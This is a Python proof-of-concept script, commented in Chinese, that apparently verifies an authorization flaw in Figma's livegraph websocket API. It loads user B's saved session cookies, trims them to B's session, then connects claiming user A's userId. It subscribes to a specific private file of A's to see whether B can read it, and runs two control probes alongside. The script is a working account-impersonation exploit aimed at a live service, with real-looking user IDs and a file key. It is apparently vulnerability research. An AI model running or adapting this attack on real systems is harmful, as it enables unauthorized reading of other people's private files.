# -*- coding: utf-8 -*-
"""决定性验证 2: 纯净B + claim A → FileByKey 读 A 私有文件完整信息
如果 FileByKey 返回 A 私有文件的数据 → 越权读取坐实 (B 伪装 A)
对照: 纯净B+claimB / 纯净A+claimA
"""
import sys, json, asyncio, io, urllib.parse
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
TARGET = "5Gs4PaTz11Hlk2sqVnidBG"   # A 私有文件
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def make_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    authn_raw = parts.get('__Host-figma.authn', '')
    authn = json.loads(urllib.parse.unquote(authn_raw))
    authn = {k: v for k, v in authn.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(authn, separators=(',', ':')))
    return '; '.join(f'{k}={v}' for k, v in parts.items())

rawB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
rawA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
PURE_B = make_pure(rawB, B_UID)
PURE_A = make_pure(rawA, A_UID)

def lg_url(fk, claim_uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={claim_uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")

async def probe(label, cookie, claim_uid, wait=15):
    frames = []
    try:
        async with websockets.connect(lg_url(TARGET, claim_uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": claim_uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{TARGET}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "auth" in msg:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "FileByKey",
                                      "viewHash": "f" * 32, "loadType": "initial",
                                      "args": {"fileKey": TARGET}}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    print(f"[{label}] 帧数={len(frames)}")
    for f in frames:
        if 'initial' in f or 'error' in f.lower() or 'viewLoaded' in f:
            print(f"    🖼 {f[:1800]}")

async def main():
    print("=" * 60)
    print("1. 纯净B + claimA → FileByKey A私有文件 (核心!)")
    await probe("纯净B claimA", PURE_B, A_UID)
    print("=" * 60)
    print("2. 纯净B + claimB → FileByKey A私有文件 (无权限对照)")
    await probe("纯净B claimB", PURE_B, B_UID)
    print("=" * 60)
    print("3. 纯净A + claimA → FileByKey A私有文件 (owner对照)")
    await probe("纯净A claimA", PURE_A, A_UID)

asyncio.run(main())
